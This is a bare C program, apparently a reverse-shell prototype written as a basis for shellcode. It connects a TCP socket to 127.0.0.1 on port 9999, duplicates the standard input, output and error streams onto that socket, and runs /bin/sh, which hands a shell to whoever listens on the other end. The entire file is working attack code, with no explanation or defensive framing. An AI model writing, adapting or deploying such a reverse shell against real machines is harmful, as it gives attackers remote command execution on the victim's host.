#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(){
	char *execargs[] = {"/bin//sh", 0};
	struct sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = inet_addr("127.0.0.1");
	sa.sin_port = htons(9999);
	int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	connect(sock, (const struct sockaddr *) &sa, 16);
	dup2(sock,0);
	dup2(sock,1);
	dup2(sock,2);
	execve(execargs[0], execargs, 0);
}
